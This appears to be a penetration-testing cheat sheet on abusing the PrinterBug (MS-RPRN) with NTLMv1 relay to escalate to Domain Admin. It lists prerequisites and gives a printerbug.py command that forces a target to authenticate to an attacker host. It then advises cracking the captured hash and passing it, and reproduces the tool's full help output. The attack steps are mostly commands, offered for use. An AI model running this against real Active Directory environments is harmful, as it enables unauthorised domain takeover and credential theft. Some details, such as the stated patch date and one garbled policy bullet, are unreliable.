# Krbrelayx - Printerbug

MS-RPRN abuse (PrinterBug), NTLM v1 relay.

## Date

CVE-2019-1040, Patch on 2019-01-11

## Synopsis

Combining the Printer Bug and NTLMv1 to Elevate to Domain Admin.

## Need

1. Any valid domain account credentials

2. Network connectivity to the targets SMB (Server Message Block) Service.

3. The target host must be running the *Print Spooler* service

4. The target host must be allowed to send NTLMv1 responses (cannot be set to enforce NTLMv2 responses)

GPO: `Security Settings\Local Policies\Security Options\Network security`

-      *Send LM& NTLM responses*

-      *Send LM& NTLM – use NTLMv2 session security if negotiated*

*-      SendNTLM responses only*.

Using `Seatbelt` can check the GPO setting with `LanmanCompatibilityLevel`.

## Example

```bash
$ printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'
$ rpcdump.py $TARGET | grep -A 6 "spoolsv"
```

When you dump the NTLM v1 hash just crack it, and pass the hash attack.

## Tools Options

```bash
$ python3 printerbug.py -h
[*] Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

usage: printerbug.py [-h] [--verbose] [-target-file file] [-port [destination port]] [-timeout timeout] [-no-ping]
                     [-hashes LMHASH:NTHASH] [-no-pass]
                     target attackerhost

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  attackerhost          hostname to connect to

options:
  -h, --help            show this help message and exit
  --verbose             Switch verbosity to DEBUG

connection:
  -target-file file     Use the targets in the specified file instead of the one on the command line (you must still specify
                        something as target name)
  -port [destination port]
                        Destination port to connect to SMB Server
  -timeout timeout      Specify a timeout for the TCP ping check
  -no-ping              Specify if a TCP ping should be done before connectionNOT recommended since SMB timeouts default to 300
                        secs and the TCP ping assures connectivity to the SMB port

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful when proxying through ntlmrelayx)

```

## Related Links

[MS-RPRN abuse (PrinterBug) - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn)

[Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - dirkjanm.io](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)

https://www.fortalicesolutions.com/posts/elevating-with-ntlmv1-and-the-printer-bug
